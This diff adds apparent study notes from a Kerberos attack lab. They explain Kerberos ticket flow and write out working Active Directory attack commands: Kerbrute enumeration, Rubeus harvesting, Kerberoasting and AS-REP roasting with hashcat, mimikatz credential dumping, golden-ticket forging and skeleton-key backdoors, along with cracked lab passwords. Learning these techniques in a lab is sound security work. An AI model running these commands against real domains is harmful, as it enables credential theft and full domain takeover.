@@ -1,0 +1,151 @@
+------------------
+NOTES
+------------------
+
+Vim
+	:%s/\s//g - remove all white space
+	:%s/\n//g - remove all new lines
+
+
+TGT - Ticket granting ticket - authenticator ticket used to request service tickets from TGS
+KDC - Key Distribution Center - service for issuing TGTs and service tickets  that consist of the AS and TGS
+AS  - Authentication Service - Issues TGTs to be used by the TGS in the domain to request acces to other machines
+TGS - Ticket Granting Service - Takes the TGT and returns a ticket to a machine or domain
+SPN - Service Principal Name - an identifier given to a service instance to associate a serbice instance with a domain
+KDC LT Key - KDC Long Term Key - key based on the KRBTGT service account to encrypt the TGT and sign the PAC
+Client LT Key - Client Long Term Key - Key based on the computer or service account, used to encrypt timestamp and session
+Service LT Key - Key based on the service account, used to encrypt the service portion of the service ticket and sign the PAC
+Session Key - Issued by the KDC when a TGT is issued, user will provide the session key to the KDC along wit the TGT
+PAC - Privilege Attribute Cert - holds all relevent info, sent with the TGT to the KDC to be signed
+
+
+AS-REQ
+	User requests a TGT from the KDC
+	Steps
+		User encrypts the timestamp NT hash and send it to the AS
+		KDC attepts to decrypt the timestamp using the NT hash of the user
+			If successful, KDC will issue a TGT and a session key
+
+Ticket contents
+	Service portion
+		User details, Session key, encrypts ticket with the service account NTLM hash
+	User Portion
+		Validity timestamp, session key, encrypts with the TGT session key
+
+Process
+	AS-REQ - User requests a TGT
+	AS-REP - KDC verifies the client and sends an encrypted TGT
+	TGS-REQ - Client sends the TGT to the TGS withth SPN of the service client to be accessed
+	TGS-REP - KDC verifies the TGT of the user and makes sure the user has access, sends a valid session key
+	AP-REQ - Client requests the service and send the valid session key to prove the user has access
+	AP-REP - Service grants access
+
+Attack Privs
+	Kerbrute Enumeration - no domain access
+	Pass the Ticket - Access as a user to the domain
+	Kerberoasting - Access as any user required
+	AS-REP Roasting - Access as any user required
+	Golden Ticket - Full domain compromise
+	Silver Ticket - Service hash required
+	Skeleton Key - Full domain compromise
+
+-----------------------------
+User Enum With Kerbrute
+-----------------------------
+
+Add "IP CONTROLLER.local" to /etc/hosts
+kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local wordlist
+10 users found with 2 hashes
+
+
+-----------------------------
+Harvesting + Brute force with Rubeus
+-----------------------------
+https://github.com/GhostPack/Rubeus
+
+Is being run on the target machine
+	Rubeus.exe harvest /interval:30
+
+-----------------------------
+Kerberoasting with Rubeus and Impacket
+-----------------------------
+Holy hell confifguring hashcat is hard, these guys at KL must be mf geniuses
+
+hash was finally obatained
+
+Impacket
+	Holy fuck it is in python2 not python3
+	kms my balls
+
+	Use Impacket or Rubeus to find all kerberoastable accounts, take the hashes and crack using hashcat
+
+	hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/Active-Directory-Wordlists/Pass.txt
+		-m mode or hash type (kerberos)
+		-a attack type (straight)
+		hash.txt hash file
+		wordlist
+
+	HTTPService:Summer2020
+	SQLService:MYPassword123#
+
+
+-----------------------------
+AS-REP Roasting
+-----------------------------
+using Rubeus here but can use impacket (hell) GetNPUsers.py
+
+After roasting and getting hashes, add into file and insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User
+
+This can be cracked with hashcat on mode 18200
+
+Admin2:P@$$W0rd
+User3:Password3
+
+
+-----------------------------
+Pass the ticket with mimikatz ;)
+-----------------------------
+Mimikatz will dump the tickets in the LSASS (memory), we can use mimikatz modules to pass the ticket to gain rights of the TGT
+
+Look into more, still a little hazy
+
+-----------------------------
+Golden/ Silver Ticket attacks with mimikatz
+-----------------------------
+Silver tickets are some times more stealthy
+Differnce between G and S
+	Silver - limited to the service that is targeted
+	Gold - has access to any Kerberos service
+
+KRBTGT
+	service account for the KDC
+	If this account in impersonated - can create a golden ticket and create a service ticket for anything else
+TGT
+	ticket to a service account
+	can only access that one service
+
+Attack overview
+	dump the ticket granting ticket of any user on the domain
+		hopefully the domain admin
+	golden ticket dump - need the KRBTGT ticket
+	silver ticket - dump any service or domain admin ticket
+
+lsadump::lsa /inject /name:Administrator
+dump the hash for the account specified
+
+Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:f9e06fa832311bd00a07323980819074 /id:1103
+create a golden ticket using the dump info from the lsadump
+
+misc::cmd
+drop into an elevated shell
+
+-----------------------------
+Kerberos Backdoors with mimikatz
+-----------------------------
+very subtle backdooring, implants itself into the memory of the domain forest allowing access to any machines with the master password
+
+implants a skeleton key that abuses AS-REQ validates timestamps, only works with Kerberos RC-4 encryption
+
+The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"
+
+
